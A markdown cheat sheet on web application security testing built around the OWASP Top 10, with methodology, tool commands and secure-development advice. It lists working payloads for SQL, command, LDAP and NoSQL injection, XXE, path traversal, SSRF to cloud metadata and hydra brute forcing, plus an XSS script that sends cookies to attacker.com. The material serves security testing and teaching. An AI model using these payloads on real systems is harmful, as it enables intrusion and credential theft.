# OWASP Security Testing Cheat Sheet

OWASP (Open Web Application Security Project) provides comprehensive guidelines, tools, and methodologies for web application security testing. This cheat sheet covers the OWASP Top 10, testing methodologies, and security best practices.

---

## Table of Contents
- [OWASP Top 10 (2021)](#owasp-top-10-2021)
- [Security Testing Methodology](#security-testing-methodology)
- [Authentication Testing](#authentication-testing)
- [Authorization Testing](#authorization-testing)
- [Input Validation Testing](#input-validation-testing)
- [Session Management](#session-management)
- [Error Handling](#error-handling)
- [Cryptography Testing](#cryptography-testing)
- [Business Logic Testing](#business-logic-testing)
- [Client-Side Testing](#client-side-testing)
- [OWASP Tools](#owasp-tools)
- [Security Headers](#security-headers)
- [Best Practices](#best-practices)

---

## OWASP Top 10 (2021)

### A01 - Broken Access Control
**Description**: Restrictions on what authenticated users can do are not properly enforced.

**Testing Techniques**:
```bash
# Test for directory traversal
curl "https://example.com/file?name=../../../etc/passwd"
curl "https://example.com/file?name=....//....//....//etc/passwd"

# Test for privilege escalation
# Change user ID in requests
curl -H "User-ID: 1" https://example.com/admin/users
curl -H "User-ID: 2" https://example.com/admin/users

# Test for insecure direct object references
# Try accessing other users' data
https://example.com/user/profile/123
https://example.com/user/profile/124
```

**Mitigation**:
- Implement proper access controls
- Use principle of least privilege
- Deny by default
- Log access control failures

### A02 - Cryptographic Failures
**Description**: Failures related to cryptography that lead to sensitive data exposure.

**Testing Techniques**:
```bash
# Check for weak SSL/TLS configuration
nmap --script ssl-enum-ciphers -p 443 example.com
testssl.sh https://example.com

# Check for unencrypted data transmission
# Use Burp Suite or OWASP ZAP to intercept traffic
# Look for sensitive data in HTTP (not HTTPS)

# Test for weak password hashing
# Check if passwords are stored in plain text or weak hashing
```

**Common Issues**:
- Hard-coded credentials
- Weak encryption algorithms
- Insufficient key management
- Unencrypted data transmission

### A03 - Injection
**Description**: User-supplied data is not validated, filtered, or sanitized.

**SQL Injection Testing**:
```sql
-- Basic SQL injection tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin' #
admin'/*

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- Time-based blind injection
'; WAITFOR DELAY '00:00:10'--
'; SELECT SLEEP(10)--

-- Boolean-based blind injection
' AND 1=1--
' AND 1=2--
```

**Other Injection Types**:
```bash
# Command injection
; ls -la
| whoami
`id`
$(whoami)

# LDAP injection
*)(|(objectClass=*))
*)(|(cn=*))

# XPath injection
' or '1'='1
' or 1=1 or '1'='1

# NoSQL injection (MongoDB)
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### A04 - Insecure Design
**Description**: Missing or ineffective control design flaws.

**Testing Focus**:
- Business logic flaws
- Missing security controls
- Inadequate threat modeling
- Insecure design patterns

### A05 - Security Misconfiguration
**Description**: Missing appropriate security hardening or misconfigured permissions.

**Testing Checklist**:
```bash
# Check for default credentials
admin:admin
admin:password
root:root
test:test

# Check for directory listing
curl https://example.com/admin/
curl https://example.com/backup/
curl https://example.com/config/

# Check for exposed configuration files
/.env
/config.php
/web.config
/application.properties

# Check HTTP security headers
curl -I https://example.com
# Look for missing: X-Frame-Options, X-Content-Type-Options, etc.
```

### A06 - Vulnerable and Outdated Components
**Description**: Using components with known vulnerabilities.

**Testing Tools**:
```bash
# Dependency scanning
npm audit
pip safety check
bundle audit

# Web application scanner
nmap --script vuln example.com
nikto -h https://example.com

# Check for known CVEs
# Use OWASP Dependency Check
```

### A07 - Identification and Authentication Failures
**Description**: Compromised user identity, authentication, or session management.

**Testing Areas**:
```bash
# Weak password policy testing
# Try common passwords
password
123456
admin
qwerty

# Brute force testing
hydra -l admin -P passwords.txt https-form-post://example.com/login

# Session fixation testing
# Check if session ID changes after login

# Account lockout testing
# Test if account gets locked after failed attempts
```

### A08 - Software and Data Integrity Failures
**Description**: Assumptions about software updates, critical data, and CI/CD pipelines.

**Testing Focus**:
- Unsigned or unverified software updates
- Insecure CI/CD pipelines
- Auto-update functionality
- Serialization/deserialization flaws

### A09 - Security Logging and Monitoring Failures
**Description**: Insufficient logging and monitoring of security events.

**Testing Checklist**:
- Login attempts not logged
- High-value transactions not logged
- No alerting for suspicious activities
- Logs not protected from tampering

### A10 - Server-Side Request Forgery (SSRF)
**Description**: Web application fetches remote resources without validating user-supplied URLs.

**Testing Techniques**:
```bash
# Basic SSRF tests
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]

# Port scanning via SSRF
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379

# Cloud metadata access
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/metadata/identity/oauth2/token

# Bypass attempts
http://127.1
http://2130706433 (decimal representation of 127.0.0.1)
http://localhost.evil.com
```

## Security Testing Methodology

### OWASP Testing Guide Phases

1. **Information Gathering**
```bash
# Passive reconnaissance
whois example.com
dig example.com
nslookup example.com
theHarvester -d example.com -b google

# Search engines
site:example.com filetype:pdf
site:example.com inurl:admin
```

2. **Configuration and Deployment Testing**
```bash
# Network configuration
nmap -sS -O example.com
nmap --script default example.com

# Application platform configuration
nikto -h https://example.com
dirb https://example.com /usr/share/dirb/wordlists/common.txt
```

3. **Identity Management Testing**
```bash
# User enumeration
# Try different usernames in login form
# Check for different response times/messages

# Account provisioning
# Test registration process
# Check for email verification bypass
```

4. **Authentication Testing**
```bash
# Password policy
# Test minimum/maximum length
# Test complexity requirements
# Test password history

# Multi-factor authentication
# Test if MFA can be bypassed
# Test backup codes
```

5. **Authorization Testing**
```bash
# Path traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Privilege escalation
# Try accessing admin functions as regular user
# Manipulate user role parameters
```

6. **Session Management Testing**
```bash
# Session ID analysis
# Check randomness and length of session IDs
# Test session fixation
# Test session timeout
```

7. **Input Validation Testing**
```bash
# Cross-site scripting (XSS)
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# SQL injection
' OR 1=1--
'; DROP TABLE users--

# XML External Entity (XXE)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## Authentication Testing

### Common Authentication Vulnerabilities

**Username Enumeration**:
```bash
# Different responses for valid/invalid users
curl -d "username=validuser&password=wrong" -X POST https://example.com/login
curl -d "username=invaliduser&password=wrong" -X POST https://example.com/login

# Time-based enumeration
time curl -d "username=admin&password=wrong" -X POST https://example.com/login
time curl -d "username=nonexistent&password=wrong" -X POST https://example.com/login
```

**Weak Password Recovery**:
```bash
# Predictable tokens
# Sequential tokens: 1001, 1002, 1003
# Timestamp-based tokens
# Check if tokens expire

# Information disclosure in reset process
# Does error message reveal if email exists?
```

**Session Management Issues**:
```bash
# Session fixation
# 1. Get session ID before login
# 2. Login with credentials
# 3. Check if session ID changed

# Session hijacking
# Steal session cookies via XSS
# Check if session works from different IP
```

## Authorization Testing

### Horizontal Privilege Escalation
```bash
# Access other users' resources
GET /user/1/profile
GET /user/2/profile  # Try accessing other user's profile

# Modify requests
POST /transfer
{
  "from": "user1",
  "to": "attacker",
  "amount": 1000
}
```

### Vertical Privilege Escalation
```bash
# Access admin functions
GET /admin/users
GET /admin/config

# Parameter manipulation
role=user → role=admin
level=1 → level=9
isAdmin=false → isAdmin=true
```

## Input Validation Testing

### XSS Testing
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Stored XSS -->
<script>
document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '">');
</script>

<!-- DOM-based XSS -->
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>

<!-- Filter bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### SQL Injection Testing
```sql
-- Error-based injection
' AND (SELECT COUNT(*) FROM information_schema.tables)>'0'--

-- Union injection
' UNION SELECT 1,2,3,4,database(),version(),7--

-- Blind injection
' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>65--

-- Time-based injection
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--
```

## Session Management

### Session Testing Checklist
```bash
# Session ID properties
# - Length and randomness
# - Secure flag set
# - HttpOnly flag set
# - SameSite attribute

# Session lifecycle
# - Timeout configuration
# - Session invalidation on logout
# - Session fixation protection

# Testing commands
# Check cookie attributes
curl -I https://example.com/login

# Test session timeout
# Login and wait for timeout period
# Try accessing protected resources
```

## OWASP Tools

### OWASP ZAP (Zed Attack Proxy)
```bash
# Start ZAP in daemon mode
zap.sh -daemon -port 8080 -config api.disablekey=true

# API calls
# Spider a target
curl "http://localhost:8080/JSON/spider/action/scan/?url=https://example.com"

# Active scan
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://example.com"

# Generate report
curl "http://localhost:8080/OTHER/core/other/htmlreport/" > report.html
```

### OWASP Dependency Check
```bash
# Install
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.4.0/dependency-check-8.4.0-release.zip

# Scan Java project
./dependency-check.sh --project "My App" --scan /path/to/project --format HTML

# Scan npm project
./dependency-check.sh --project "My App" --scan package.json --format JSON
```

### OWASP Amass
```bash
# Subdomain enumeration
amass enum -d example.com
amass enum -d example.com -src
amass enum -d example.com -brute

# Database queries
amass db -d example.com -list
amass db -d example.com -show
```

## Security Headers

### Essential Security Headers
```http
# Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

# HTTP Strict Transport Security
Strict-Transport-Security: max-age=31536000; includeSubDomains

# X-Frame-Options
X-Frame-Options: DENY

# X-Content-Type-Options
X-Content-Type-Options: nosniff

# X-XSS-Protection
X-XSS-Protection: 1; mode=block

# Referrer Policy
Referrer-Policy: strict-origin-when-cross-origin

# Permissions Policy
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Testing Security Headers
```bash
# Check headers with curl
curl -I https://example.com

# Use online tools
# securityheaders.com
# observatory.mozilla.org

# Use OWASP ZAP to check headers
# Passive scan will identify missing headers
```

## Best Practices

### Secure Development Practices
1. **Input Validation**
   - Validate all input on server side
   - Use allowlists over denylists
   - Encode output appropriately

2. **Authentication & Authorization**
   - Implement proper session management
   - Use strong authentication mechanisms
   - Apply principle of least privilege

3. **Error Handling**
   - Don't reveal sensitive information in errors
   - Log security events
   - Implement proper exception handling

4. **Cryptography**
   - Use strong encryption algorithms
   - Implement proper key management
   - Hash passwords with salt

### Security Testing Integration

**In Development**:
```bash
# Static analysis
# SonarQube, Checkmarx, Veracode

# Dependency checking
npm audit fix
bundle audit

# IDE security plugins
# Install security-focused linters and plugins
```

**In CI/CD**:
```yaml
# Example GitHub Actions workflow
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Run OWASP ZAP Baseline Scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'https://example.com'
```

### Vulnerability Disclosure
1. **Responsible Disclosure**
   - Follow coordinated vulnerability disclosure
   - Provide clear vulnerability reports
   - Allow reasonable time for fixes

2. **Bug Bounty Programs**
   - Set clear scope and rules
   - Provide appropriate rewards
   - Maintain good communication

---

## Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)

---
*Originally compiled from various sources. Contributions welcome!*